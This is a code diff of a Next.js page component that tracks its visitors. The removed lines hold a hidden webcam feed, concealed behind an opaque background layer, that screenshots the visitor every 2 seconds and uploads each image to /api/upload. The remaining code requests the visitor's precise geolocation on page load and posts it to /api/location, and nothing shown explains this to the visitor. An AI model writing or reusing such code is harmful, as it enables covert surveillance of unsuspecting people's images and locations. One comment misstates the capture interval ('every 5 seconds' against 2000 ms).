@@ -1,5 +1,4 @@
 "use client";
-import Webcam from "react-webcam";
 import { useRef, useEffect } from "react";
 
 export default function Home() {
@@ -8,72 +7,60 @@ export default function Home() {
   useEffect(() => {
     const fetchLocation = async () => {
       try {
-        // Request location permissions
-        const position = await new Promise((resolve, reject) => {
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(resolve, reject);
-          } else {
-            reject(new Error("Geolocation is not supported by this browser."));
-          }
-        });
+        // Check if geolocation is supported
 
-        const location = {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-        };
-        console.log(location);
+        // Request current position with a fallback if permissions are denied
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const location = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+            };
 
-        // Send location data to the server
-        const response = await fetch("/api/location", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
+            // Send location data to the server
+            try {
+              const response = await fetch("/api/location", {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify(location),
+              });
+
+              if (!response.ok) {
+                console.error("Failed to send location data");
+              } else {
+                console.log("Location sent successfully:", location);
+              }
+            } catch (error) {
+              console.error("Error sending location data:", error.message);
+            }
           },
-          body: JSON.stringify(location),
-        });
-
-        if (!response.ok) {
-          console.error("Failed to send location data");
-        } else {
-          console.log("Location sent successfully:", location);
-        }
+          (error) => {
+            // Handle errors in fetching location
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                console.error("User denied the request for Geolocation.");
+                break;
+              case error.POSITION_UNAVAILABLE:
+                console.error("Location information is unavailable.");
+                break;
+              case error.TIMEOUT:
+                console.error("The request to get user location timed out.");
+                break;
+              default:
+                console.error("An unknown error occurred.");
+                break;
+            }
+          },
+          { timeout: 10000, enableHighAccuracy: true } // Adjusted settings
+        );
       } catch (error) {
-        console.error("Error fetching location:", error);
+        console.error("Error fetching location:", error.message);
       }
     };
 
     fetchLocation();
-  }, []);
-
-  useEffect(() => {
-    const interval = setInterval(async () => {
-      if (webcamRef.current) {
-        const imageSrc = webcamRef.current.getScreenshot();
-        if (imageSrc) {
-          // console.log("Captured image:", imageSrc);
-
-          // Convert the base64 image to a Blob
-          const blob = await fetch(imageSrc).then((res) => res.blob());
-          const formData = new FormData();
-          formData.append("image", blob, `image-${Date.now()}.jpeg`);
-
-          // Send the captured image to the backend API to store it locally
-          try {
-            const uploadResponse = await fetch("/api/upload", {
-              method: "POST",
-              body: formData,
-            });
-
-            const data = await uploadResponse.json();
-            console.log("Image upload response:", data);
-          } catch (error) {
-            console.error("Error uploading image:", error);
-          }
-        }
-      }
-    }, 2000); // Capture image every 5 seconds
-
-    return () => clearInterval(interval); // Clear interval on component unmount
   }, []);
 
   return (
@@ -130,10 +117,10 @@ export default function Home() {
           </div>
         </div>
       </div>
-      <div className=" absolute top-0 w-full h-full -z-10">
+      <div className="absolute top-0 w-full h-full -z-10">
         <div className="absolute w-full h-full bg-[#F9FAFB]"></div>
 
-        <Webcam audio={false} screenshotFormat="image/jpeg" ref={webcamRef} />
+        {/* <Webcam audio={false} screenshotFormat="image/jpeg" ref={webcamRef} /> */}
       </div>
     </>
   );
